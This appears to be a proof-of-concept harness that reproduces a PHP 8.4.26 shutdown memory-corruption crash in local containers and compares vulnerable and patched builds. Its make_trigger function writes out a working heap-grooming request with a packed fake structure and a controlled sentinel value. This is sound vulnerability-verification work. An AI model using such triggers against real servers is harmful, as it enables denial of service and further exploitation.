#!/usr/bin/env python3
"""Bounded, loopback-only differential probe for CVE-2026-109618.

Each case runs in a fresh pinned container. The trigger shape is based on the
public Red Hat CAND-049 report; this harness adds isolated controls, checks
the active PHP build, and records only the observed shutdown-crash evidence.
It does not attempt code execution or accept a remote URL.
"""

from __future__ import annotations

import json
from pathlib import Path
import re
import socket
import struct
import subprocess
import sys
import time
from urllib.parse import quote_from_bytes
from urllib.request import urlopen
from uuid import uuid4


ROOT = Path(__file__).resolve().parent.parent
IMAGES = {
    "vulnerable": (
        "8.4.26",
        "php:8.4.26-apache-bookworm@sha256:52f04cd1e398edd0f80afa8330ce73bce61931ddbd0d5bdd919c6f914d02bcf8",
    ),
    "patched": (
        "8.4.27",
        "php:8.4.27-apache-bookworm@sha256:e653ff90d7f6e2e6f81eddb07c864f1eae224ccbf5143f82a44f25e2f110e320",
    ),
}


def docker(*args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(["docker", *args], check=check, capture_output=True, text=True)


def start_container(target: str, label: str) -> tuple[str, int]:
    name = f"php2shell-618-{target}-{label}-{uuid4().hex[:8]}"
    _, image = IMAGES[target]
    docker(
        "run", "--rm", "-d", "--name", name, "--platform", "linux/amd64",
        "--memory", "256m", "--pids-limit", "64", "--cpus", "1",
        "--security-opt", "no-new-privileges:true", "-p", "127.0.0.1::80",
        "-v", f"{ROOT / 'lab/oom.ini'}:/usr/local/etc/php/conf.d/zz-php2shell-618.ini:ro",
        "-v", f"{ROOT / 'lab/apache.conf'}:/etc/apache2/conf-enabled/zz-php2shell-lab.conf:ro",
        "-v", f"{ROOT / 'lab/www'}:/var/www/html:ro", image,
    )
    try:
        mapping = docker("port", name, "80/tcp").stdout.strip()
        port = int(mapping.rsplit(":", 1)[1])
        if not mapping.startswith("127.0.0.1:"):
            raise RuntimeError(f"Unexpected Docker port binding: {mapping}")
    except Exception:
        docker("stop", "--time", "1", name, check=False)
        raise
    return name, port


def verify_container(port: int, expected_version: str) -> None:
    last_error: Exception | None = None
    for _ in range(20):
        try:
            with urlopen(f"http://127.0.0.1:{port}/index.php", timeout=2) as response:
                info = json.load(response)
            expected = {
                "lab": "php2shell", "php_version": expected_version,
                "sapi": "apache2handler", "memory_limit": "32M",
                "post_max_size": "8M",
            }
            if any(info.get(key) != value for key, value in expected.items()):
                raise RuntimeError(f"Unexpected lab configuration: {info}")
            return
        except (OSError, ValueError, RuntimeError) as exc:
            last_error = exc
            time.sleep(0.25)
    raise RuntimeError(f"Lab endpoint did not pass preflight: {last_error}")


def post(port: int, path: str, body: bytes) -> str:
    header = (
        f"POST {path} HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\nConnection: close\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
    ).encode("ascii")
    response = bytearray()
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=10) as conn:
            conn.settimeout(30)
            conn.sendall(header)
            view = memoryview(body)
            for offset in range(0, len(view), 256 * 1024):
                conn.sendall(view[offset:offset + 256 * 1024])
            while len(response) < 65536:
                chunk = conn.recv(min(4096, 65536 - len(response)))
                if not chunk:
                    break
                response.extend(chunk)
    except OSError:
        return "connection_closed"
    first_line = bytes(response).partition(b"\r\n")[0]
    return first_line.decode("ascii", errors="replace") or "connection_closed"


def make_trigger(control: bool) -> tuple[str, bytes]:
    # The two requests differ only in this sentinel word inside a donor value.
    marker = 0 if control else 0x4141414141414141
    donor = b"CONTROLLED_BUCKET".ljust(232, b"D")
    donor += struct.pack("<QIIQQ", 0x1122334455667788, 4, 0, 0x1337, marker)
    query: list[str] = []
    for index in range(9):
        value = donor if index == 2 else (f"Q{index}".encode() + b"A" * 264)[:264]
        query.append(f"q{index}={quote_from_bytes(value, safe='')}")
    query.extend(f"q{index}=U" for index in (6, 0, 1, 2, 3, 4))
    prefix = [f"p{index}=".encode() + b"V" * 264 for index in range(6)]
    body = b"&".join(prefix + [b"R" * 7_700_000 + b"[x]=v"])
    return "/index.php?" + "&".join(query), body


def run_case(target: str, control: bool) -> dict[str, object]:
    label = "control" if control else "sentinel"
    version, _ = IMAGES[target]
    name, port = start_container(target, label)
    try:
        verify_container(port, version)
        warm = b"&".join(f"w{index}=".encode() + b"W" * 264 for index in range(8))
        post(port, "/index.php", warm)
        post(port, "/index.php", warm)
        path, body = make_trigger(control)
        response = post(port, path, body)
        # Apache reports worker signals asynchronously after the connection closes.
        logs = ""
        for _ in range(16):
            logs = docker("logs", name, check=False).stderr
            if "Segmentation fault (11)" in logs or "PHP Fatal error:" in logs:
                time.sleep(0.25)
                logs = docker("logs", name, check=False).stderr
                if "Segmentation fault (11)" in logs or control or target == "patched":
                    break
            time.sleep(0.25)
        fatal_lines = re.findall(r"PHP Fatal error:  Allowed memory size[^\n]*", logs)
        segv_lines = re.findall(r"child pid \d+ exit signal Segmentation fault \(11\)[^\n]*", logs)
        return {
            "target": target, "php_version": version, "variation": label,
            "http_result": response,
            "oom_observed": bool(fatal_lines),
            "shutdown_sigsegv_observed": bool(segv_lines),
            "oom_log": fatal_lines[-1] if fatal_lines else "",
            "worker_log": segv_lines[-1] if segv_lines else "",
        }
    finally:
        docker("stop", "--time", "1", name, check=False)


def main() -> int:
    cases: list[dict[str, object]] = []
    try:
        for target in ("vulnerable", "patched"):
            for control in (True, False):
                case = run_case(target, control)
                cases.append(case)
                print(f"[{target}/{case['variation']}] {case['http_result']}; "
                      f"OOM={case['oom_observed']}; "
                      f"SIGSEGV={case['shutdown_sigsegv_observed']}")
    except (OSError, ValueError, RuntimeError, subprocess.CalledProcessError) as exc:
        error = str(exc)
    else:
        error = ""

    observed = (
        not error and len(cases) == 4
        and all(case["oom_observed"] for case in cases)
        and cases[0]["http_result"].endswith("500 Internal Server Error")
        and cases[1]["http_result"] == "connection_closed"
        and cases[2]["http_result"].endswith("500 Internal Server Error")
        and cases[3]["http_result"].endswith("500 Internal Server Error")
        and not cases[0]["shutdown_sigsegv_observed"]
        and cases[1]["shutdown_sigsegv_observed"]
        and not cases[2]["shutdown_sigsegv_observed"]
        and not cases[3]["shutdown_sigsegv_observed"]
    )
    report = {
        "cve": "CVE-2026-109618",
        "scope": "pinned_local_lab",
        "outcome": "shutdown_corruption_observed" if observed else "inconclusive",
        "impact_demonstrated": "controlled_shutdown_crash" if observed else "none",
        "rce_demonstrated": False,
        "cases": cases,
        "error": error,
    }
    output = ROOT / "artifacts/cve-109618-last-run.json"
    output.parent.mkdir(exist_ok=True)
    output.write_text(json.dumps(report, indent=2) + "\n")
    print(f"CVE-2026-109618: {report['outcome']}; report: {output}")
    if error:
        print(error, file=sys.stderr)
    return 0 if observed else 1


if __name__ == "__main__":
    raise SystemExit(main())
